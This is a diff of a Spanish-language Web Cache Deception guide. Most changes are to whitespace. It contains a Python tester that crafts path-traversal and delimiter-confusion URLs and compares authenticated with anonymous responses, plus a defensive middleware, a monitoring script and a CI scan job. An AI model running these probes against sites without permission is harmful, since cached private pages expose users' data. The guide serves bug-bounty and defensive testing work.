@@ -190,36 +190,36 @@ class AdvancedWCDTester:
     def __init__(self, target_url, session_cookie=None):
         self.target_url = target_url.rstrip('/')
         self.session = requests.Session()
-    
+  
         if session_cookie:
             self.session.cookies.update(session_cookie)
-    
+  
         # Extensiones de alta probabilidad basadas en research 2024
         self.extensions = [
             'css', 'js', 'png', 'jpg', 'gif', 'svg', 'txt', 'json', 'xml',
             'woff', 'ico', 'pdf', 'webp', 'woff2', 'eot', 'ttf'
         ]
-    
+  
         # Delimitadores para confusion attacks
         self.delimiters = ['@', ':', ';', '#', '%2f', '%3b', '%40']
-    
+  
         # Path traversal payloads
         self.traversals = ['..%2f', '%2e%2e%2f', '%2e%2e/', '../']
-    
+  
     def test_basic_wcd(self, endpoint):
         """Test básico con extensiones static"""
         results = []
-    
+  
         for ext in self.extensions:
             test_url = f"{self.target_url}{endpoint}/fake.{ext}"
-        
+      
             # Request con autenticación
             auth_resp = self.session.get(test_url)
             time.sleep(1)
-        
+      
             # Request sin autenticación
             anon_resp = requests.get(test_url)
-        
+      
             if self.is_potential_wcd(auth_resp, anon_resp):
                 results.append({
                     'url': test_url,
@@ -229,21 +229,21 @@ class AdvancedWCDTester:
                     'anon_size': len(anon_resp.text),
                     'cache_headers': self.extract_cache_headers(anon_resp)
                 })
-            
+          
         return results
   
     def test_delimiter_confusion(self, endpoint):
         """Test delimiter confusion attacks"""
         results = []
-    
+  
         for delimiter in self.delimiters:
             for ext in self.extensions:
                 test_url = f"{self.target_url}{endpoint}{delimiter}fake.{ext}"
-            
+          
                 auth_resp = self.session.get(test_url)
                 time.sleep(1)
                 anon_resp = requests.get(test_url)
-            
+          
                 if self.is_potential_wcd(auth_resp, anon_resp):
                     results.append({
                         'url': test_url,
@@ -251,26 +251,26 @@ class AdvancedWCDTester:
                         'delimiter': delimiter,
                         'extension': ext
                     })
-                
+              
         return results
   
     def test_path_traversal(self, endpoint):
         """Test path traversal normalization"""
         results = []
-    
+  
         # Buscar directorio static conocido (común: /static, /assets, /resources)
         static_dirs = ['/static', '/assets', '/resources', '/public', '/dist']
-    
+  
         for static_dir in static_dirs:
             for traversal in self.traversals:
                 for ext in self.extensions:
                     # Construir URL que el caché vea como static pero origen normalice
                     test_url = f"{self.target_url}{static_dir}/{traversal}{endpoint.lstrip('/')}.{ext}"
-                
+              
                     auth_resp = self.session.get(test_url)
                     time.sleep(1)
                     anon_resp = requests.get(test_url)
-                
+              
                     if self.is_potential_wcd(auth_resp, anon_resp):
                         results.append({
                             'url': test_url,
@@ -279,7 +279,7 @@ class AdvancedWCDTester:
                             'traversal': traversal,
                             'extension': ext
                         })
-                    
+                  
         return results
   
     def is_potential_wcd(self, auth_resp, anon_resp):
@@ -300,11 +300,11 @@ class AdvancedWCDTester:
             'Cache-Control', 'Age', 'X-Cache', 'CF-Cache-Status',
             'X-Served-By', 'X-Cache-Hits', 'Expires'
         ]
-    
+  
         for header in relevant_headers:
             if header in response.headers:
                 cache_headers[header] = response.headers[header]
-            
+          
         return cache_headers
 
 # Uso del tester
@@ -325,16 +325,16 @@ def main():
   
     for endpoint in critical_endpoints:
         print(f"[*] Testing endpoint: {endpoint}")
-    
+  
         # Test múltiples técnicas
         basic_results = tester.test_basic_wcd(endpoint)
         delimiter_results = tester.test_delimiter_confusion(endpoint) 
         traversal_results = tester.test_path_traversal(endpoint)
-    
+  
         all_results.extend(basic_results)
         all_results.extend(delimiter_results)
         all_results.extend(traversal_results)
-    
+  
         if basic_results or delimiter_results or traversal_results:
             print(f"[!] POTENTIAL WCD FOUND in {endpoint}")
   
@@ -466,12 +466,12 @@ function validateContentType(req, res, next) {
     const originalSend = res.send;
     res.send = function(data) {
         const actualContentType = res.get('Content-Type');
-    
+  
         if (isStaticPath(path) && actualContentType !== expectedContentType) {
             res.status(404).send('Not Found');
             return;
         }
-    
+  
         originalSend.call(this, data);
     };
   
@@ -536,23 +536,23 @@ def monitor_wcd_indicators(base_url, endpoints):
         for pattern in suspicious_patterns:
             test_url = pattern.replace('*', 'test')
             test_url = base_url + test_url.replace('/profile', endpoint)
-        
+      
             try:
                 response = requests.get(test_url, timeout=5)
-            
+          
                 # Detectar indicadores sospechosos
                 if (response.status_code == 200 and 
                     len(response.text) > 1000 and
                     'user' in response.text.lower()):
-                
+              
                     print(f"[{datetime.now()}] SUSPICIOUS: {test_url}")
                     print(f"  Status: {response.status_code}")
                     print(f"  Size: {len(response.text)} bytes")
                     print(f"  Cache headers: {response.headers.get('Cache-Control', 'None')}")
-                
+              
             except Exception as e:
                 continue
-            
+          
             time.sleep(1)
 
 # Ejecución
@@ -586,7 +586,7 @@ jobs:
         run: |
           pip install requests
           git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git
-      
+    
       - name: Run WCD Scan
         env:
           TARGET_URL: ${{ secrets.STAGING_URL }}
@@ -597,14 +597,14 @@ jobs:
             --auth-header "Authorization: Bearer $AUTH_TOKEN" \
             --wcd \
             --output results.json
-      
+    
       - name: Check Results
         run: |
           if grep -q "vulnerable" results.json; then
             echo "::error::Web Cache Deception vulnerability detected"
             exit 1
           fi
-      
+    
       - name: Upload Results
         uses: actions/upload-artifact@v3
         with:
@@ -693,9 +693,9 @@ data by exploiting path mapping discrepancies between CDN and origin server.
 Web Cache Deception sigue siendo una amenaza crítica en 2024 porque representa un fallo sistémico donde componentes individualmente correctos crean vulnerabilidades cuando interactúan. Los atacantes modernos combinan técnicas de path traversal, delimiter confusion y normalization discrepancies para bypassear defensas tradicionales.[^1]
 
 La clave para una defensa efectiva está en comprender que WCD es un **problema de sistema completo**, requiriendo configuración coordinada entre CDN, caché y servidor origen. Para los bug bounty hunters, el enfoque debe estar en identificar estas discrepancias sutiles en el parsing de URLs y explotar configuraciones de caché agresivas que priorizan rendimiento sobre seguridad.
-<span style="display:none">[^14][^18][^22][^26][^30][^34][^38][^42][^46][^50][^52]</span>
+<span style="display:none">[^18][^26][^34][^42][^50][^52]</span>
 
-<div style="text-align: center">Web Cache Deception (WCD) - Guía Completa</div>
+<div style="text-align: center">-</div>
 
 [^1]: https://es-la.tenable.com/blog/identifying-web-cache-poisoning-and-web-cache-deception-how-tenable-web-app-scanning-can-help
     
